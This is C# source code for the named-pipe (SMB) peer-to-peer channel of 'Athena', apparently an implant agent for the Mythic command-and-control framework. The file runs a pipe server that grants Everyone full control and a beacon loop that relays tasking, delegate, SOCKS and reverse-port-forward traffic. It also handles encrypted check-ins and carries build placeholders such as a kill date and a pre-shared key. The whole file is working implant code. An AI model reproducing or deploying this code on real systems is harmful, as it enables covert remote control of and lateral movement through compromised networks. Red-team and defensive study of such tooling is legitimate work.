using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System.Collections.Concurrent;
using H.Pipes;
using H.Pipes.Args;
using H.Pipes.AccessControl;
using System.Diagnostics;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Athena.Models.Comms.SMB;
using Athena.Models.Proxy;

namespace Athena
{
    public class Smb : IProfile
    {
        public string uuid { get; set; }
        public string psk { get; set; }
        public string pipeName = "pipename";
        private string checkinResponse { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        private bool connected { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("false");
        private PipeServer<SmbMessage> serverPipe { get; set; }
        public PSKCrypto crypt { get; set; }
        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        private ManualResetEvent onCheckinResponse = new ManualResetEvent(false);
        private CancellationTokenSource cts = new CancellationTokenSource();
        private CancellationToken cancellationToken { get; set; }
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
        private bool checkedin = false;
        public Smb()
        {
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            uuid = "%UUID%";
            this.connected = false;
            this.psk = "AESPSK";
            //this.psk = "";
            this.sleep = 0;
            this.jitter = 0; ;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }
            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }
            this.cancellationToken = this.cts.Token;
            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
            this.serverPipe.StartAsync(this.cancellationToken);

            Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
        }
        public async Task StartBeacon()
        {
            Debug.WriteLine($"[{DateTime.Now}] Starting Beacon Loop.");
            this.cts = new CancellationTokenSource();
            while (!cancellationToken.IsCancellationRequested)
            {
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);

                List<string> responses = responseTask.Result;
                List<DelegateMessage> delegateMessages = delegateTask.Result;
                List<MythicDatagram> socksMessages = socksTask.Result;
                List<MythicDatagram> rpFwdMessages = rpFwdTask.Result;

                if (responses.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0 || rpFwdMessages.Count > 0)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Responses: " + responses.Count());
                    Debug.WriteLine($"[{DateTime.Now}] Delegates: " + delegateMessages.Count());
                    Debug.WriteLine($"[{DateTime.Now}] Socks Messages: " + socksMessages.Count());
                    GetTasking gt = new GetTasking()
                    {
                        action = "get_tasking",
                        tasking_size = -1,
                        delegates = delegateMessages,
                        socks = socksMessages,
                        responses = responses,
                        rpfwd = rpFwdMessages,
                    };

                    //Just send the stuff, I don't really currently know how to error check sends.
                    Debug.WriteLine($"[{DateTime.Now}] Sending regular get_tasking");
                    await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
                }
            }
        }
        private async void OnMythicMessageReceived(string message)
        {
            //We have a full message from the Pipe.
            if (this.encrypted)
            {
                //Decrypt if necessary
                message = this.crypt.Decrypt(message);
            }
            else
            {
                message = (await Misc.Base64Decode(message)).Substring(36);
            }

            //Check what kind of message we got.
            Dictionary<string, string> msg = Misc.ConvertJsonStringToDict(message);
            //Check if it's a checkin or not
            if (msg.ContainsKey("action") && msg["action"] == "checkin")
            {
                //We got our checkin response
                this.checkinResponse = message;
                this.onCheckinResponse.Set();

            }
            else
            {
                //We got a task response
                GetTaskingResponse gtr = JsonSerializer.Deserialize(message, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr == null)
                {
                    return;
                }

                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                this.SetTaskingReceived(this, tra);
            }

            //Should I send a message received response
        }
        public bool StopBeacon()
        {
            cts.Cancel();
            return true;
        }
        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe
            Debug.WriteLine($"[{DateTime.Now}] Starting Checkin Process");
            await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for our ManualResetEvent to trigger indicating we got a response.
            //await this.serverPipe.WaitMessageAsync();
            onCheckinResponse.WaitOne();
            //We got a message, but we should make sure it's not empty.
            if (!string.IsNullOrEmpty(this.checkinResponse))
            {
                string res = this.checkinResponse;
                this.checkinResponse = String.Empty;
                this.checkedin = true;
                Debug.WriteLine($"[{DateTime.Now}] Finished Checkin Process");
                return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
            }
            Debug.WriteLine($"[{DateTime.Now}] Failed Checkin Process");
            return new CheckinResponse()
            {
                status = "failed"
            };
        }
        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            //Event handler for new messages

            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.delegate_message.Length} bytes");
            try
            {
                if (args.Message.message_type == "success")
                {
                    return;
                }

                this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists

                this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);

                if (args.Message.final)
                {
                    this.OnMythicMessageReceived(this.partialMessages[args.Message.guid].ToString());
                    this.partialMessages.TryRemove(args.Message.guid, out _);
                }

                await this.SendSuccess();
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in SMB Forwarder: {e}");
            }
        }
        private async Task OnClientConnection()
        {
            Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
            onClientConnectedSignal.Set();
            this.connected = true;

            await this.SendUpdate();
        }
        private async Task OnClientDisconnect()
        {
            Debug.WriteLine($"[{DateTime.Now}] Client Disconnected.");
            this.connected = false;
            onEventHappenedSignal.Set(); //Indicate something happened
            onClientConnectedSignal.Reset();
            this.partialMessages.Clear();
        }
        private async Task<string> Send(string json)
        {
            if (!connected)
            {
                Debug.WriteLine($"[{DateTime.Now}] Waiting for connection event...");

                onClientConnectedSignal.WaitOne();
                Debug.WriteLine($"[{DateTime.Now}] Connect Receieved");
            }

            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                SmbMessage sm = new SmbMessage()
                {
                    guid = Guid.NewGuid().ToString(),
                    final = false,
                    message_type = "chunked_message"
                };

                IEnumerable<string> parts = json.SplitByLength(4000);

                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {json.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    sm.delegate_message = part;

                    if (part == parts.Last())
                    {
                        sm.final = true;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");

                    await this.serverPipe.WriteAsync(sm);

                }

                Debug.WriteLine($"[{DateTime.Now}] Done writing message to pipe.");

            }
            catch (Exception e)
            {
                this.connected = false;
            }

            return String.Empty;
        }

        private async Task SendSuccess()
        {
            //Indicate the server that we're done processing the message and it can send the next one (if it's there)
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                message_type = "success",
                final = true,
                delegate_message = String.Empty
            };

            await this.serverPipe.WriteAsync(sm);
        }
        private async Task SendUpdate()
        {
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                final = true,
                message_type = "path_update",
                delegate_message = this.uuid
            };

            await this.serverPipe.WriteAsync(sm);
        }
    }
}
